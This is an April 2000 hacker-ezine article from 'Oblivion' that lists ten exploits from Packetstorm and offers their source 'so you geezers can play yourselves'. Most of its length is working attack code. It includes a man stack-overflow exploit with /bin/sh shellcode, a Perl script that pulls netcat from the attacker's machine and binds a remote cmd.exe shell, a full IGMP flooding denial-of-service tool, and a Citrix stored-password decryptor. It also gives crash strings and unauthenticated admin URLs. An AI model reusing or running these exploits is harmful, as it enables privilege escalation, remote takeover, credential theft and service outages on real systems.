---
title: "EXPLOITS"
ezine: "0blivion"
---

# EXPLOITS

**Ezine:** 0blivion

<div className="ascii-content">

```
           _____________________________________________________
          /              Oblivion Underground Magazine          \
         /                   Issue 2    15/04/2000               \
        ▌                   Aprils Top 10...Exploits              ▌
         \                         by Slider                     /
          \_____________________________________________________/


What to write, What to write...

Well, i have to do something for a frequent monthly article... Well, I do the
news, but thats sometimes boring....

So the top ten Exploits/Vulnerabilities have been created.

Every month I will bring you a top ten run down of exploits and 
vulnerabilities, including descriptions and the source code so you geezers can
play yourselves.

Top Ten Exploits/Vulnerabilities in the last month.

As supplied by Packetstorm.securify.com

No. 1  = IIS-enumerate
No. 2  = win98-con-lan
No. 3  = BIND 8.2 - 8.2.2 *Remote root Exploit How-To*
No. 4  = AIM-Dos.txt
No. 5  = icadecrypt.c
No. 6  = manxpl.c
No. 7  = spawncmd.pl
No. 8  = Infradig 1.225 Security Hole
No. 9  = Netscape-wp.dir-list
No. 10 = sXe.c

These were supplied by packetstorm.securify.com, If any source code was 
taken from variable sources, they will be named.

No. 1  = IIS-enumerate

Date = 9th March

Finder = Jason Lutz

Description = Another way to find the web root directory in IIS 4.0 if its 
on a share.

Source Code =

I was recently auditing the security on one of my
web servers when I came across a new Extension Enumerate Root Web Server
Directory Vulnerability for&lt;BR>IIS 4.0. Going to the main website and asking 
for
anything.idq I get the&lt;BR>page cannot be found. But if the files for the web
server reside on a share&lt;BR>the full network path is found.&lt;BR>&lt;BR>The
Exploit:&lt;BR>&lt;BR>On the shared network drive, &lt;A
href="http://server/anything.idq">http://server/anything.idq&lt;/A>&lt;BR>&lt;BR>The 
file
&lt;A
href="file://\\share\wwwroot\inetpub\webpage\*">\\share\wwwroot\inetpub\webpage\*&lt;/A>.idq
is on a network share. IDQ,&lt;BR>IDA and HTX files cannot be placed on a 
network
share.&lt;BR>&lt;BR>Tested on Windows NT 4.0 Service Pack 5 and 6a&lt;BR>&lt;BR>I would 
like
to say thank you to rain.forest.puppy. for all of his help.&lt;BR>&lt;BR>props out 
to
ADM, Wiretrip, w00w00 and l0pht.&lt;BR>&lt;BR>Jason Lutz&lt;BR>Sprint Print Inc&lt;BR>&lt;A
href="mailto:jason@spis.net">jason@spis.net&lt;/A>&lt;BR>&lt;BR>&lt;/FONT>&lt;/DIV>&lt;/BODY>&lt;/HTML>

Source =

----------------------------------------------------

No. 2       = win98-con-lan

Date        = 24th March

Finder      = Toxic Waste

Description = All versions of Win 95 & 98 in a LAN can be crashed using a 
              modified version of the 'win98-con'-Bug.

Source Code = All versions of Win 95 & 98 in a LAN can be crashed using a
              modified version of the 'win98-con'-Bug. The target must have
              at least one shared directory (read-only access is enough).

              You just have to execute a 'special' link in a HTML-File on your
              own machine. This will crash down the victim's machine in the
              LAN and maybe even in the Internet (I've not yet tested this
              possibility).


              &lt;html>
              &lt;head>&lt;title>Crash!&lt;/title>&lt;/head>
              &lt;body>
              &lt;a href="file://victim/directory/con/con">click me!&lt;/a>
              &lt;/body>
              &lt;/html>

              In this code fragment 'victim' is the name of victim's machine
              and 'directory' is any shared directory on this machine.
              Clicking on this link will crash the machine.

Source      = Packetstorm.securify.com

----------------------------------------------------

No. 3       = BIND 8.2 - 8.2.2 *Remote root Exploit How-To*

Date        = 30th March

Finder      = E-Mind

Description = BIND 8.2 - 8.2.2 *Remote root Exploit How-To*

Source Code = http://packetstorm.securify.com/0003-exploits/NXT-Howto.txt
              (To large to add)

Source      = Packetstorm.securify.com

----------------------------------------------------

No. 4       = AIM-Dos.txt

Date        = 3rd March

Finder      = Cruz

Description = AIM can be crashed using upper case ascii symbols remotley

Source Code = As all Ascii-Symbols can be displayed in &#XXX; format, where
              XXX are numbers from 0-255, AIM seems not to check the XXX for
              higher values and some strings above 255 result in aim crashing
              completly or in part.

              E.g. the string &#770; will result in crashing the whole aim,
              but &#771; will crash only the instant message window (&#771;
              was only tested once by me).
              It will crash the AIM of the attacker too, because AIM displays
              the string in the attacker-Instant Message, so the attacker-AIM
              also tries to convert it and errors.

              There is already an unofficial fix available, which can be
              downloaded at my hompage: http://laugh.at/cruz
              The fix is an edited ate32.dll, which should be copied to the
              aim directory.
              With it, aim doesnt try to convert "&#XXX;"-type of strings
              anymore, a minimum drawback (note: with that fix, the attacker
              can use this exploit to crash other unfixed AIMs, but wont
              crash his/her own AIM).

Versions    = I tested this only on 3.5+ versions of AIM, but all other
              versions are most likely affected too.

Source      = Packetstorm.securify.com

----------------------------------------------------

No. 5       = icadecrypt.c

Date        = 31st March

Finder      = Dug Song

Description = Decrypt stored Citrix ICA passwords (in appsrv.ini)

Source Code =
/*
  icadecrypt.c

  Decrypt stored Citrix ICA passwords (in appsrv.ini).

  Dug Song &lt;dugsong@monkey.org>
*/

#include &lt;sys/types.h>
#include &lt;netinet/in.h>
#include &lt;stdio.h>
#include &lt;string.h>
#include &lt;ctype.h>

int
hex_decode(char *src, u_char *dst, int outsize)
{
  char *p, *pe;
  u_char *q, *qe, ch, cl;

  pe = src + strlen(src);
  qe = dst + outsize;

  for (p = src, q = dst; p < pe && q < qe && isxdigit((int)*p); p += 2) {
    ch = tolower(p[0]);
    cl = tolower(p[1]);

    if ((ch >= '0') && (ch <= '9')) ch -= '0';
    else if ((ch >= 'a') && (ch <= 'f')) ch -= 'a' - 10;
    else return (-1);

    if ((cl >= '0') && (cl <= '9')) cl -= '0';
    else if ((cl >= 'a') && (cl <= 'f')) cl -= 'a' - 10;
    else return (-1);

    *q++ = (ch << 4) | cl;
  }
  return (q - dst);
}

int
ica_decrypt(u_char *pass, int len)
{
  u_short i;
  u_char *p, key;

  if (len < 4)
    return (0);

  i = ntohs(*(u_short *)pass);

  if (i != len - 2)
    return (0);

  key = pass[2];
  p = pass + 3;

  for (i -= 2; i > 0; i--)
    p[i] = p[i - 1] ^ p[i] ^ key;

  p[0] ^= (key | 'C');

  i = len - 3;
  memmove(pass, pass + 3, i);
  pass[i] = '\0';

  return (1);
}

void
usage(void)
{
  fprintf(stderr, "Usage: icadecrypt &lt;file>\n");
  exit(1);
}

int
main(int argc, char *argv[])
{
  FILE *f;
  u_char line[1024], pass[128];
  int len;

  if (argc != 2 || *argv[1] == '-')
    usage();

  if ((f = fopen(argv[1], "r")) == NULL) {
    perror("fopen");
    exit(1);
  }
  while (fgets(line, sizeof(line), f) != NULL) {
    if (strncmp(line, "Password=", 9) == 0) {
      len = hex_decode(line + 9, pass, sizeof(pass));
      if (ica_decrypt(pass, len))
        printf("; icadecrypt: [%s]\n", pass);
    }
    printf("%s", line);
  }
  fclose(f);

  exit(0);
}

/* 5000. */

Source      = Packetstorm.securify.com

----------------------------------------------------

No. 6       = manxpl.c

Date        = 1st March

Finder      = anathema

Description = Exploits the stack overflow in man (PAGER env var) yielding 
              egid man.

Source Code =

/* linux x86
   exploits the stack overflow in man (PAGER env var) yielding egid man.

   retpos is dependent upon argv[1] to man. if you wish to change the
   manpage name, change the #define RETPOS to 3990 - strlen("manpage")

   anathema@box.co.uk
*/

#include &lt;stdio.h>
#include &lt;stdlib.h>

#define RETPOS          3987
#define OFFSET          1000

char c0de[] =
"\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89\x76\x08\xb0\x0b\x87\xf3\x8d"
"\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0\x40\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";

int
main(int argc, char **argv)
{
    u_char buf[4096] = {0};
    u_long addr      = (u_long)&addr;
    int ret = RETPOS;

    if (argc > 1) addr += atoi(argv[1]);
    else addr += OFFSET;

    memset(buf, 0x90, ret - strlen(c0de));
    memcpy(buf + ret - strlen(c0de), c0de, strlen(c0de));

    fprintf(stderr, "addr 0x%lx\n", addr);
    buf[ret++] = (addr & 0xff);
    buf[ret++] = (addr >> 8) & 0xff;
    buf[ret++] = (addr >> 16) & 0xff;
    buf[ret++] = (addr >> 24) & 0xff;

    setenv("PAGER", buf, -1);
    execl("/usr/bin/man", "man", "cat", NULL);

    perror("execl");
}

/* EOF */

Source      = Packetstorm.securify.com

----------------------------------------------------

No. 7       = spawncmd.pl

Date        = 20th March

Finder      = N/A

Description = Spawn a command shell on remote host with MSADC

Source Code =

!/usr/bin/perl
# -- Spawn a command shell on remote host with MSADC
# -- Shouts to RFP of course, [sSh], computer club,
# -- dust puppy II, irc-servers.com, attrition.org,
# -- and hnn.com
# --
# -- rackmount. good fellaz.

# -- This is more or less a dirty script put together
# -- in 5 minutes.

# -- Add "+ +" to your .rhosts file (yes i know this
# -- will make you vulnerable to certain types of shit)
# -- and put nc.exe (netcat) in your home directory.

if (!($ARGV[0])) {
  print "spawncmd.pl [remote host] [my _REAL_ ip] [desired port]\n";
  exit;
}

if (!($ARGV[1])) {
  print "spawncmd.pl $ARGV[0] [my _REAL_ ip] [desired port]\n";
  exit;
}

if (!($ARGV[2])) {
  print "spawncmd.pl $ARGV[0] $ARGV[1] [desired port]\n";
  exit;
}

open(RHOST, "| ./msadc2.pl -h $ARGV[0]");
print RHOST "rcp -b $ARGV[1].$ENV{'USER'}:$ENV{'HOME'}/nc.exe .\n";
close RHOST;

# -- You may need to increase this depending on the connection
# -- between you and the other host
sleep 5;

open(RHOST, "| ./msadc2.pl -h $ARGV[0]");
print RHOST "nc -l -p $ARGV[2] -e cmd.exe\n";
close RHOST;

# -- After finished connecting you can take "+ +" out of
# -- your .rhosts file.

system("telnet $ARGV[0] $ARGV[2]");

Source      = packetstorm.securify.com

----------------------------------------------------

No. 8       = Infradig 1.225 Security Hole

Date        = 6th March

Finder      = Nemesystm

Description = There are no restrictions on the online administration bit of 
              the server software.

Source Code = The administration service runs on port 81 (as adefault, can be
              set).
              Connecting to: http://www.server.com:81/sysadmin/sysadmin.cgi
              will let you edit accounts, add users, set all kinds of things
              like ports, and start services. (FTP, etc)
              On the HTTP server, you can go to:
              http://www.server.com/sysadmin/
              and it will/should automatically refer you to the
              administration service.

Source      = Packetstorm.securify.com

----------------------------------------------------

No. 9       = Netscape-wp.dir-list

Date        = 23rd March

Finder      = F0bic

Description = Netscape's WebPublisher software, is an addon to
              Netscape-Enterprise servers, which allows file uploads and
              downloads, deleting and changing permissions on files.
              This file is accessible for any third party user who can then 
              install a local copy of the  webpublisher or either run the
              remote version and gain access to the system.
              (Frontpage all over again)

Source Code = Netscape's WebPublisher software, is an addon to
              Netscape-Enterprise servers, which allows file uploads and
              downloads, deleting and changing permissions on files. The
              WebPublisher installs by default in the /publisher directory on
              the webserver. This file is accessible for any third party user
              who can then install a local copy of the webpublisher or either
              run the remote version and gain access to the system.
              By doing a GET on /publisher we get a page that is titled
              "WebPublisher Home Page" and that contains some information
              about webpublisher. On the page there is also a Start
              Webpublisher button, which when pressed will download the
              WebPublisher Java Applet set. The default size for this download
              is 677k. It will then autostart the Java Applets and ask you to
              grant three electronic certificates ( developed by VeriSign ).
              When granted the server will query you for a username. You can
              input any username in here that you want. It doesn't need to be
              a valid system username. The applet will continue and open the
              WebPublisher window itself which will prompt you a directory
              listing of the webserver along with a menu at the top.

              This access violation lets you see the virtual directory root
              of the webserver. The menubar at the top lets you upload and
              download files and directories, modify files, delete and move
              them. These requests do ask for a password which can be brute
              forced. Nonetheless, WebPublisher is not supposed to allow
              directory listing and access (to open directories) to third
              party unauthorized users.

Source      = Packetstorm.securify.com

----------------------------------------------------

No. 10      = sXe.c

Date        = March 3rd

Finder      = N/A

Description = sXe sends IGMP packets, denying service to windows machines. 
              Just shows how lame Windows machines are.

Source Code =

/*
*  - Program: sXe.c
*  - Purpose: IGMP DoS
*  - Author: l-n1nja
*  - Compile: cc -o sXe sXe.c
*  - Date: 15/8/99
*  - Usage: ./sXe -h
*
*  - If you can figure out how to use this, you can create quite an
*    effective attack from even a 14kbs modem.
*
*/

#define __BSD_SOURCE

/* Header files */

#include &lt;db.h>
#include &lt;netinet/in_systm.h>
#include &lt;errno.h>
#include &lt;stdio.h>
#include &lt;stdlib.h>
#include &lt;netinet/in.h>
#include &lt;netinet/ip.h>
#include &lt;netinet/igmp.h>
#include &lt;arpa/inet.h>
#include &lt;netdb.h>
#include &lt;unistd.h>
#include &lt;string.h>
#include &lt;sys/signal.h>
#include &lt;sys/types.h>
#include &lt;sys/socket.h>

__BEGIN_DECLS

/* Definitions */

#ifndef IGMP_ALL_HOSTS
#define IGMP_ALL_HOSTS (htonl(0xE0000001L))
#endif

#define TRUE  (0x1)
#define FALSE (0x0)
#define ERR   (0xffffffff)

#define IP_SIZE        (sizeof(struct ip))
#define IGMP_SIZE      (sizeof(struct igmp))
#define TOTAL_SIZE     (IP_SIZE + IGMP_SIZE)
#define IP_OFF         (0)
#define IGMP_OFF       (IP_SIZE)
#define MAX_BROADCASTS 100

/* Data-types */

struct broadcast_ele {
  u_long ipaddr;
};

typedef int sock_t;

/* Global variables */

FILE * stream = stderr;
int    count = ERR;
sock_t raw_sock;
struct broadcast_ele bc_table[MAX_BROADCASTS];
char * packet_buf;
char * yes = "1";

/* Prototypes */

int     main              __P ((int, char * *));
void    usage             __P ((char *));
void    ctrlc             __P ((int));
void    die               __P ((int));
size_t  send_igmp_packet  __P ((u_long, u_long, u_char, u_char));
char *  strip             __P ((u_long));
u_long  res               __P ((char *));
u_short generate_checksum __P ((u_short *, int));

__END_DECLS

/* Functions */

int main (int argc, char * * argv)
{
  FILE * fptr;
  u_int pos = 0;
  u_char type = 0;
  u_char code = 0;
  u_long victim = ERR;
  u_char * ptr = *argv;
  u_char * fname = NULL;

  ++argv; --argc;

  while (argv && *argv)
  {
    if ( (*(*(argv))) == '-' )
    {
      switch ( *(*(argv) + 1) )
      {
        case ('n'):
        {
          if ( !(*(argv + 1)) || ((count = atoi(*(argv + 1))) <= 0) )
          {
            usage (ptr);
          }
          ++argv;
          break;
        }
        case ('t'):
        {
          if ( !(*(argv + 1)) || ((type = atoi(*(argv + 1))) <= 0) )
          {
            usage (ptr);
          }
          ++argv;
          break;
        }
        case ('c'):
        {
          if ( !(*(argv + 1)) || ((code = atoi(*(argv + 1))) <= 0) )

          {
            usage (ptr);
          }
          ++argv;
          break;
        }
        default: usage (ptr);
      }
    }
    else if (victim == ERR)
    {
      if ((victim = res(*(argv))) == ERR)
      {
        fprintf(stderr, "> Bad victim: %s\n", *argv);
        exit(EXIT_FAILURE);
      }
    }
    else if (!fname)
    {
      fname = (*(argv));
    }
    else usage (ptr);
    ++argv;
  }

  if (victim == ERR || !fname)
  {
    usage(ptr);
  }

  if (!(packet_buf = (char *)malloc(TOTAL_SIZE)))
  {
    fprintf(stream, "> Ran out of memory\n");
    exit(EXIT_FAILURE);
  }

  for (pos = 0; pos < MAX_BROADCASTS; ++pos)
  {
    ((*(bc_table + pos)).ipaddr) = 0;
  }
  pos = 0;

  if (!(fptr = fopen(fname, "r")))
  {
    fprintf(stream, "> Couldn't open %s: %s\n", fname, strerror(errno));
    exit(EXIT_FAILURE);
  }

  while ( (!feof(fptr)) && (pos < MAX_BROADCASTS) )
  {
    u_long ipaddr;
    memset(packet_buf, 0, TOTAL_SIZE);
    fgets(packet_buf, TOTAL_SIZE, fptr);

    if ( (!*packet_buf) || (*packet_buf == '#') ) continue;
    else if ((ipaddr = inet_addr(packet_buf)) <= 0)
    {
      fprintf(stream, "> Invalid IP: %s\n", packet_buf);
    }
    else
    {
      ((*(bc_table + pos)).ipaddr) = ipaddr;
      ++pos;
    }
  }

  if (!pos)
  {
    fprintf(stream, "> Loaded no broadcasts\n");
    exit(EXIT_SUCCESS);
  }

  if ((raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == ERR)
  {
    fprintf(stream, "> Raw socket could not be created: %s\n",
            strerror(errno));
    exit(EXIT_FAILURE);
  }

  else if ( (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, (char *)&yes,
             sizeof(yes)) == ERR) ||
            (setsockopt(raw_sock, SOL_SOCKET, SO_BROADCAST, (char *)&yes,
             sizeof(yes)) == ERR) )
  {
    fprintf(stream, "> Could not set socket opts: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }

  fprintf(stream,
          "> sXe.c IGMP attack\n");
  fprintf(stream, "> victim: %s\n", strip(victim));

  if (count == ERR) fprintf(stream, "> count: Infinite\n");
  else              fprintf(stream, "> count: %d\n", count);

  fprintf(stream, "> type: %d\n", (!type) ? IGMP_HOST_MEMBERSHIP_QUERY : 
type);
  fprintf(stream, "> code: %d\n", code);

  signal(SIGINT, ctrlc);

  fprintf(stream, "> Hit Ctrl-C to abort\n");

  pos = 0;
  while (count)
  {
    if ( (pos == MAX_BROADCASTS) || ((*(bc_table + pos)).ipaddr) == 0)
    {
      pos = 0;
      continue;
    }

    if ( send_igmp_packet(victim, (*(bc_table + pos)).ipaddr,
                          type, code) == ERR )
    {
      fprintf(stream, "> send_igmp_packet() failed: %s\n",
              strerror(errno));
      die(EXIT_FAILURE);
    }

    if (count != ERR) --count;
    ++pos;
  }
  die(EXIT_SUCCESS);
}

void usage (char * pname)
{
  fprintf(stream,
    "Usage: %s &lt;victim> &lt;bc_file> [ -n &lt;number> ] [ -t &lt;type> ]"
" [ -c &lt;code> ]\n", pname);

  exit(EXIT_SUCCESS);
}

void ctrlc (int useless)
{
  die (EXIT_SUCCESS);
}

void die (int code)
{
  fprintf(stream, "> Flood ended\n");
  shutdown(raw_sock, 2);
  free(packet_buf);
  exit(code);
}

size_t send_igmp_packet (u_long from, u_long to, u_char type, u_char code)
{
  int ret;
  struct ip * ip_ptr = (struct ip *)(packet_buf + IP_OFF);
  struct igmp * igmp_ptr = (struct igmp *)(packet_buf + IGMP_OFF);
  struct sockaddr_in sa;

  sa.sin_port = htons(0);
  sa.sin_addr.s_addr = to;
  sa.sin_family = AF_INET;

  memset(packet_buf, 0, TOTAL_SIZE);

  ip_ptr->ip_hl  = 5;
  ip_ptr->ip_v   = 4;
  ip_ptr->ip_tos = 0;
  ip_ptr->ip_len = TOTAL_SIZE;
  ip_ptr->ip_id  = 0;
  ip_ptr->ip_off = 0;
  ip_ptr->ip_ttl = 255;
  ip_ptr->ip_p   = IPPROTO_IGMP;
  ip_ptr->ip_sum = generate_checksum((u_short *)ip_ptr, IP_SIZE);
  /* ip_ptr->ip_src.s_addr = from; */
  ip_ptr->ip_src.s_addr = INADDR_ANY;
  ip_ptr->ip_dst.s_addr = to;

  igmp_ptr->igmp_type  = (!type) ? IGMP_HOST_MEMBERSHIP_QUERY : type;
  igmp_ptr->igmp_code  = code;
  igmp_ptr->igmp_cksum = generate_checksum((u_short *)igmp_ptr, IGMP_SIZE);
  igmp_ptr->igmp_group.s_addr = IGMP_ALL_HOSTS;

  ret = sendto(raw_sock, packet_buf, TOTAL_SIZE, 0,
               (struct sockaddr *)&sa, sizeof(sa));

  return (ret);
}

char * strip (u_long ipaddr)
{
  struct in_addr addr;
  addr.s_addr = ipaddr;
  return (inet_ntoa(addr));
}

u_long res (char * host)
{
  u_long ipaddr;
  struct hostent * hp;

  if ((ipaddr = inet_addr(host)) == ERR)
  {
    if (!(hp = gethostbyname(host))) return (FALSE);
    memcpy(&ipaddr, hp->h_addr, hp->h_length);
  }
  return (ipaddr);
}

/* Not my code */

u_short generate_checksum (u_short *addr, int len)
{
   register int nleft = len;
   register int sum = 0;
   u_short answer = 0;

   while (nleft > 1) {
      sum += *addr++;
      nleft -= 2;
   }

   if (nleft == 1) {
      *(u_char *)(&answer) = *(u_char *)addr;
      sum += answer;
   }

   sum = (sum >> 16) + (sum + 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
   return(answer);
}
/* EOF */

Source       = Packetstorm.securify.com


Well Slider, you have done yourself proud with that great list of the top 10
exploits available this month.  Remember to read Oblivion Issue 3 for next
months Exploits section - Cyber0ptix

```

</div>
